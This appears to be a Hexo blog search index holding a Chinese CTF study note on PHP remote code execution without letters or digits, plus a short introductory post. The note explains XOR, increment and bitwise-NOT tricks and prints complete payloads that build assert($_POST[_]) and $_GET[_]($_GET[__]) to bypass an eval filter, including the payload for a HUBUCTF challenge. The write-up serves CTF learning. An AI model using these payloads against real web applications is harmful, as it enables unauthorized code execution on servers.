<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>无数字和字母RCE</title>
      <link href="/2024/02/05/%E6%97%A0%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8DRCE/"/>
      <url>/2024/02/05/%E6%97%A0%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8DRCE/</url>
      
        <content type="html"><![CDATA[<h1 id="无数字和字母RCE"><a href="#无数字和字母RCE" class="headerlink" title="无数字和字母RCE"></a>无数字和字母RCE</h1><p>[TOC]</p><p>最原始的情况</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><hr><h3 id="1-异或"><a href="#1-异或" class="headerlink" title="1.异或"></a>1.异或</h3><p>举个例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;A&quot;</span>^<span class="string">&quot;?&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最后输出  ~</p><p>计算过程：首先将<code>A</code>和<code>?</code>分别转换为对应的ASCII码，A变为65，?变为63，然后将其转换为对应的二进制数，A变为<code>1000001</code>，1变为<code>111111</code>，接下来就进行运算，异或的运算规则是相同为0，不同为1</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">A</span>:      <span class="number">1000001</span></span><br><span class="line">?:      <span class="number">0111111</span>(少一位，前面补<span class="number">0</span>即可) </span><br><span class="line">结果：   <span class="number">1111110</span></span><br></pre></td></tr></table></figure><p>异或一次不仅能构造出一个字符，也可以一次构造出多个字符，比如<code>(&#39;AB&#39;)^(&#39;11&#39;)</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;AB&quot;</span>^<span class="string">&quot;11&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最后输出 ps</p><hr><h3 id="2-自增"><a href="#2-自增" class="headerlink" title="2.自增"></a>2.自增</h3><p>在php中，在处理字符变量的算数运算时，PHP 沿袭了 Perl 的习惯，而非 C 的。并且字符变量只能递增不能递减，并且只支持字母数字的ASCII的自增，对其他字符自增无效。简单来说，就是我们可以通过自增来获取我们想要的字母。即<code>‘a++&#39;--&gt;&#39;b</code>‘;<code>&#39;b&#39;++--&gt;&#39;c&#39;</code>;<code>&#39;A&#39;++--&gt;&#39;B&#39;</code></p><p>而php还有一个特性，字符串和数组拼接会返回Array。这样我们就获取到了字母。<strong>限制了字母和数字，但是我们可以传入空格</strong></p><p><img src="/img/3.png" alt="屏幕截图 2024-02-04 191838"></p><p>成功获取到了字符<code>Array</code>，然后我们获取想获取A的话，就可以采用<code>$_[0]</code>这种方式来获取，但我们是不能够写数字的，所以我们这里可以用一个判断,比如我们在<code>[]</code>里加一个<code>==$</code>，此时因为<code>空</code>和<code>$</code>不同，它就会输出<code>0</code>，此时也就等同于<code>$_[0]</code></p><p><img src="/img/4.png" alt="image-20240204192356382"></p><p>得到字母后就可以开始构造，例如<code>system(ls)</code>这样的命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;<span class="comment">//Array</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;$&#x27;</span>];<span class="comment">//A</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//B</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//C</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//D</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//E</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;<span class="comment">//E</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//F</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//G</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>;<span class="comment">//G</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="comment">//T</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$___</span>.<span class="variable">$__</span>.<span class="variable">$_</span>;<span class="comment">//GET</span></span><br><span class="line"><span class="comment">//var_dump($_);</span></span><br><span class="line"><span class="variable">$_</span>=<span class="string">&#x27;_&#x27;</span>.<span class="variable">$_</span>;<span class="comment">//_GET</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$$_</span>[_](<span class="variable">$$_</span>[__]));</span><br><span class="line"><span class="comment">//$_GET[_]($_GET[__])</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$</span>_=[].<span class="string">&#x27;&#x27;</span>;<span class="symbol">$</span>_=<span class="symbol">$</span>_[<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;$&#x27;</span>];<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>__=<span class="symbol">$</span>_;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>___=<span class="symbol">$</span>_;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_=<span class="symbol">$</span>___.<span class="symbol">$</span>__.<span class="symbol">$</span>_;<span class="symbol">$</span>_=<span class="string">&#x27;_&#x27;</span>.<span class="symbol">$</span>_;<span class="symbol">$</span><span class="symbol">$</span>_[_](<span class="symbol">$</span><span class="symbol">$</span>_[__]);</span><br></pre></td></tr></table></figure><p><strong>依情况看是否进行url编码</strong></p><p>最后用GET方式对变量<code>_</code>和<code>__</code>传参就行</p><hr><h3 id="3-取反"><a href="#3-取反" class="headerlink" title="3.取反"></a>3.取反</h3><p>取反其实是利用了不可见字符，我们对一个字符进行两次取反，得到的还是其本身。当我们进行一次取反过后，对其进行URL编码，再对其进行取反，此时可以得到可见的字符，它的本质其实还是这个字符本身，然后因为取反用的多是不可见字符，所以这里就达到了一种绕过的目的。</p><p>php中取反符号为<code>~</code>，当使用按位取反操作符 ‘~’ 时，它会翻转一个整数的所有位，举例</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span> = <span class="number">10</span>; <span class="comment">// 二进制表示为 0000 1010</span></span><br><span class="line"><span class="variable">$y</span> = ~<span class="variable">$x</span>; <span class="comment">// 按位取反后为 1111 0101</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$y</span>; <span class="comment">// 输出结果为 -11</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最后输出结果为-11，详细取反运算见文章<a href="https://blog.csdn.net/WilliamsWayne/article/details/78259501">PHP ~(按位取反)位运算符</a></p><p>一个简单的php取反脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data1</span>=<span class="title function_ invoke__">urlencode</span>(~(<span class="string">&#x27;assert&#x27;</span>));<span class="comment">//通过两次取反运算得到assert</span></span><br><span class="line"><span class="variable">$data2</span>=<span class="title function_ invoke__">urlencode</span>(~(<span class="string">&#x27;_POST&#x27;</span>));<span class="comment">//通过两次取反运算得到_POST</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$data1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$data2</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>故构造payload：</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=~(<span class="meta">%9E</span><span class="meta">%8C</span><span class="meta">%8C</span><span class="meta">%9A</span><span class="meta">%8D</span><span class="meta">%8B</span>);    //这里利用取反符号把它取回来，<span class="variable">$_</span>=assert</span><br><span class="line"><span class="variable">$__</span>=~(<span class="meta">%A0</span><span class="meta">%AF</span><span class="meta">%B0</span><span class="meta">%AC</span><span class="meta">%AB</span>);      //<span class="variable">$__</span>=_POST</span><br><span class="line"><span class="variable">$___</span>=$<span class="variable">$__</span>;                   //<span class="variable">$___</span>=<span class="variable">$_POST</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[<span class="number">_</span>]);                 //assert(<span class="variable">$_POST</span>[<span class="number">_</span>]);</span><br><span class="line">放到一排就是：</span><br><span class="line"><span class="variable">$_</span>=~(<span class="meta">%9E</span><span class="meta">%8C</span><span class="meta">%8C</span><span class="meta">%9A</span><span class="meta">%8D</span><span class="meta">%8B</span>);<span class="variable">$__</span>=~(<span class="meta">%A0</span><span class="meta">%AF</span><span class="meta">%B0</span><span class="meta">%AC</span><span class="meta">%AB</span>);<span class="variable">$___</span>=$<span class="variable">$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[<span class="number">_</span>]);</span><br></pre></td></tr></table></figure><p>再进行POST传参，传入自己想执行的命令</p><hr><h3 id="更多自增知识点和赛题见文章从CTFShow-RCE挑战-中学习无字母数字构造webshell"><a href="#更多自增知识点和赛题见文章从CTFShow-RCE挑战-中学习无字母数字构造webshell" class="headerlink" title="更多自增知识点和赛题见文章从CTFShow[RCE挑战]中学习无字母数字构造webshell"></a>更多自增知识点和赛题见文章<a href="https://xz.aliyun.com/t/11929?time__1311=mqmx0DBG0QExlxx2DU27HYG=G8iF=x&alichlgref=https://www.google.com/#toc-14">从CTFShow[RCE挑战]中学习无字母数字构造webshell</a></h3><hr><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>一道简单的例题：</p><p><strong>[HUBUCTF 2022 新生赛]HowToGetShell</strong></p><p><img src="/img/1.png" alt="image-20240204190451810"></p><p>过滤了字母，因为php5中的assert函数会将括号里面的字符串当作php代码来执行。因此我们可以构造出<code>assert($_GET[6])</code>，因为很多都是不可见的字符，所以说就先url编码了一下</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="string">&#x27;%40&#x27;</span>^<span class="string">&#x27;%21&#x27;</span> ;s:<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span> ; e:<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%1E&#x27;</span> ; r:<span class="string">&#x27;%7E&#x27;</span>^<span class="string">&#x27;%0C&#x27;</span> ; t:<span class="string">&#x27;%7C&#x27;</span>^<span class="string">&#x27;%08&#x27;</span></span><br><span class="line">G:<span class="string">&#x27;%3C&#x27;</span>^<span class="string">&#x27;%7B&#x27;</span>;E:<span class="string">&#x27;%3E&#x27;</span>^<span class="string">&#x27;%7B&#x27;</span>;T:<span class="string">&#x27;%0B&#x27;</span>^<span class="string">&#x27;%5F&#x27;</span>;</span><br><span class="line"><span class="regexp">//</span>拼接起来</span><br><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%40%7B%7B%7B%7E%7C&#x27;</span>^<span class="string">&#x27;%21%08%08%1E%0C%08&#x27;</span>);  <span class="regexp">//</span> <span class="variable">$_</span>=assert</span><br><span class="line"><span class="variable">$_1</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%3C%3E%0B&#x27;</span>^<span class="string">&#x27;%7B%7B%5F&#x27;</span>);<span class="regexp">//</span><span class="variable">$_1</span>=_GET</span><br><span class="line"><span class="variable">$_2</span>=$<span class="variable">$_1</span>; <span class="comment">#$_2=$_GET</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$_2</span>[<span class="number">6</span>]);  <span class="regexp">//</span>assert(<span class="variable">$_GET</span>[<span class="number">6</span>])</span><br></pre></td></tr></table></figure><p>最后在环境变量中找到flag</p><p><img src="/img/2.png" alt="image-20240204190946852"></p><p>最终payload：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">GET</span>:?<span class="number">6</span>=phpinfo();</span><br><span class="line"><span class="attribute">POST</span>:mess=$_=(&#x27;%<span class="number">40</span>%<span class="number">7</span>B%<span class="number">7</span>B%<span class="number">7</span>B%<span class="number">7</span>E%<span class="number">7</span>C&#x27;^&#x27;%<span class="number">21</span>%<span class="number">08</span>%<span class="number">08</span>%<span class="number">1</span>E%<span class="number">0</span>C%<span class="number">08</span>&#x27;);$_1=&#x27;_&#x27;.(&#x27;%<span class="number">3</span>C%<span class="number">3</span>E%<span class="number">0</span>B&#x27;^&#x27;%<span class="number">7</span>B%<span class="number">7</span>B%<span class="number">5</span>F&#x27;);$_2=$$_1;$_($_2[<span class="number">6</span>]);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一篇博客</title>
      <link href="/2024/01/31/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
      <url>/2024/01/31/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<p>这个博客是终于搭好了，本来是搭好了的，那个文章封面图总是报错，我也知道为啥，现在也没弄好，先不管了。本站是基于hexo+github搭建的，主题是butterfly。这个站比较简洁，没有做很多美化，因为主要用作学习交流，弄那么花也不方便看。<del>其实是怕报错和懒</del></p><p>建个博客很简单，对着大佬的文章库库ctrlcv就行了，以下是我在建站时参考的文章</p><p><a href="https://blog.csdn.net/qq_58608526/article/details/124652412">Hexo+Github博客搭建教程</a></p><p><a href="https://blog.csdn.net/mjh1667002013/article/details/129290903">【Hexo】Hexo搭建Butterfly主题并快速美化</a></p><p>这个博客以后可能会发一些我个人学习方面的东西，如果有疑问或者想和我交流的可以联系我，联系方式Q：3358756550</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
